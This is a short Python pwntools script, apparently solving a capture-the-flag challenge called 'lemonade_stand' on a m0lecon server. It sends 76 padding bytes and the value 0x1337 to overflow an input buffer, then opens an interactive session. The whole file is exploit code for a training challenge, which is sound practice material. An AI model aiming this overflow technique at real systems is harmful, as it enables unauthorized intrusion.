#!usr/bin/env python3
from pwn import *

context.binary = elf =ELF('./lemonade_stand', checksec=False)
p = remote("offsec.m0lecon.it", 13513)

offset_target = 76 
p.recvuntil(b"price:")
payload = b'A' * offset_target + p64(0x1337)

p.sendline(payload)
p.interactive()